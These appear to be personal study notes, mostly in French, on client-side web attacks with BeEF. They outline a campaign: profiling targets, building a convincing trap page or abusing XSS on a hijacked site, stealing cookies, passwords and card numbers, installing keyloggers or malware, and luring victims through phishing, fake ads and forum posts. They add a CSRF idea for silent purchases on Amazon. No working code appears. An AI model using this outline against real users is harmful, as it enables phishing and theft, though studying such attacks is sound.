automatic rule angine in beef to run automaticly modules [automatic rules](https://books.google.fr/books?id=hyOGDwAAQBAJ&pg=PA216&lpg=PA216&dq=beef-xss+persistent+github&source=bl&ots=tyPi4vIhjf&sig=ACfU3U3rqJ4q4edr5CMLDOmCtF6K4h_rIA&hl=fr&sa=X&ved=2ahUKEwj9ucvNotKAAxV2TqQEHZh8CCI4ChDoAXoECB8QAw#v=onepage&q=beef-xss%20persistent%20github&f=false)




# III - En pratique

### a. identifier la victime

- Centres d’intérêts : identifier le portrait sociologique de la cible
- Moyens de communications : quels sont les sites habituellement consultés, quels sont les réseaux-sociaux utilisés, est-ce que l’email est un vecteur pertinent, etc. Autant de questions qui permettent de cibler un peu mieux la population visée.
- identifier les applications et OS utilisés par la population ciblée alors il n’aura pas besoin de s’éparpiller dans le développement de plusieurs attaques techniques ciblant plusieurs applications dans plusieurs versions


### b. Créer la page piégée :

- soit ma propre page avec un nom de domaine crédible (proposer une page crédible qui n’éveillera pas les soupçons. Le mieux étant de générer une réaction positive mais non marquante afin que l’utilisateur oublie au plus vite avoir accédé à la page)
- page avec une faille de type XSS hébergée sur un site légitime que j'aurais détourné

==> mettre un certificat ssl dessus ? Pour legitimate encore plus la page

  ==> que fait le code dans la page piégée ?
- récupérer certaines informations ? (cookies, mots de passes, numéro de CB, etc.)
- Charger un malware sur le poste client ?  si la vulnérabilité exploitée donnait matière à réaliser un RCE
- modifier le contenu et le fonctionnement du site web

- steal cookies
- read sensitive info
- inject malware
- install a keylogger
- reverse shell ? Jsshell
- ....

Les navigateurs sont en fait un ensemble de logiciels : le navigateur lui-même, plus des logiciels tiers tels qu'Adobe Acrobat Reader, Adobe Flash, iTunes, QuickTime, RealPlayer, etc. Tous sont potentiellement vulnérables aux attaques côté client. 

[vidéo explication](https://www.youtube.com/watch?v=TVBMqQGLCYM)


### c. Envoyer la page piégée :
- emails
- fausses bannières de pub
- lien sur un forum
- poste sur un réseau social

[Infos intéressantes](https://www.0x0ff.info/2021/attaque-cote-client-xss-et-phishing/)

















---------------------------------

```
left+cmd pour uncapture souris
ctrl+alt
```

- On peut imaginer que en même temps que la personne est sur notre site malicieux, en background on ouvre amazon, et on commande un truc quon va s’envoyer à nous-même (XSRF) = à travers la connexion client serveur qui est déjà faite, on peut faire une requête qui est une transaction malveillante, l’utilisateur ne le voit pas visuellement car ca se passe en background ⇒ c’est une cross site request foregery ⇒ exploits server trust in user takes advantage of saved authentication


## Links

[OWASP Top 10 most critical security risks to web applications](https://owasp.org/www-project-top-ten/)

How 22 Lines of Code Claimed 380,000 Victims. How We Used Machine Learning to to Pinpoint the Magecart Crime Syndicate.
[whole explanation of british airways xss exploitation](https://schoenbaum.medium.com/inside-the-breach-of-british-airways-how-22-lines-of-code-claimed-380-000-victims-8ce1582801a0)
